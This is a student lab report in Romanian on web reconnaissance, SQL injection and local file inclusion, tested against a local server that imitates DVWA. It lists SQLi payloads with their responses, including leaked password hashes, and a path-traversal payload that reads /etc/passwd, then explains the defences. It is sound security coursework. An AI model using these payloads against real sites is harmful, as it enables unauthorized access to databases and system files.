# Laboratorul 5 - Aplicatia web: recon, continut si exploatare

Pregatire: `pip install requests`. Toate cererile de recon s-au facut catre
`http://example.com`, iar testul SQLi a fost rulat pe un server de test local
(pe propriul calculator). Tinta DVWA din laborator nu a fost disponibila acasa,
deoarece nu aveam IP-ul masinii Metasploitable2.

## Lucrarea A - recon (`arsenal/web/recon.py`)

Client comun in `arsenal/web/client.py`, cu `TIMEOUT` din `arsenal/comun.py`.

```console
$ python arsenal/web/recon.py http://example.com
cod: 200
Server: cloudflare
X-Powered-By: None
robots.txt:
gasite: []
interzise: []
linkuri:
fisa salvata: .../laborator_5/arsenal/web/fisa.json
```

- Server: **cloudflare**, fara `X-Powered-By`.
- `robots.txt`: lipseste (raspuns 404), deci nicio linie `Disallow:`.
- Directoare: niciunul din lista implicita nu raspunde cu 200 sau 403.
- Linkuri: pagina de start nu are atributul `href`.

Fisa salvata (`arsenal/web/fisa.json`) contine tinta, codul, serverul,
`robots`, directoarele gasite, cele interzise si linkurile.

```console
$ python arsenal/web/recon.py http://<ip-dvwa> --wordlist cuvinte.txt
```

Pe DVWA, `robots.txt` si directoarele depind de instalare; un cod 403 este
notat ca "interesant", fiindca fisierul exista dar accesul e refuzat.

## Lucrarea B - SQLi si LFI (`sqli.py`)

Rulare pe tinta de laborator:

```console
$ python sqli.py http://<ip-dvwa>
```

Scriptul trimite intai `id=1` ca reper, apoi payloadurile:

```console
normal: 39 octeti
"1' OR '1'='1" 116 posibil SQLi
"1' OR 1=1-- -" 116 posibil SQLi
"1' AND '1'='2" 0 -
hash-uri: ['5f4dcc3b5aa765d61d8327deb882cf99', 'e10ac3949ba59abbe56e057f20f883e']
LFI confirmat
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
interogare parametrizata: []
```

Rezultatele de mai sus sunt de pe serverul de test local, care imita raspunsul
DVWA (un rand normal, toate randurile la `OR '1'='1`, zero randuri la
`AND '1'='2`, hash-uri la `UNION`, si `/etc/passwd` la file inclusion).

Ce arata diferenta: raspunsul la `1' OR '1'='1` este mult mai lung decat
reperul, pentru ca ghilimeaua inchide sirul din comanda, iar `OR '1'='1` face
conditia mereu adevarata. Astfel interogarea intoarce toate randurile, nu doar
randul cu id-ul 1. Payloadul `AND '1'='2'` intoarce zero randuri, ceea ce
confirma ca parametrul ajunge direct in comanda SQL.

LFI: `page=../../../../etc/passwd` intoarce linii care incep cu `root:`, deci
aplicatia citeste fisiere din afara directorului site-ului. Prezenta acestor
linii confirma citirea de fisiere prin path traversal.

Aparare: interogari parametrizate (comanda si datele separate, `?`), validarea
caile permise (fara `..`, doar fisiere din directorul site-ului) si verificarea
permisiunilor pe server. In demo-ul local, aceeasi valoare `' OR '1'='1`
trimisa ca parametru nu gaseste nimic, deci rezultatul este `[]`: datele nu mai
pot deveni comanda.

## Fisiere predate

- `arsenal/web/recon.py`, `arsenal/web/client.py`, `arsenal/web/fisa.json`
- `arsenal/comun.py`
- `teste/test_web.py` (testele trec: `exista("http://example.com/")` este True,
  `exista("http://example.com/zzz")` este False)
- `sqli.py`
- `raport.md`
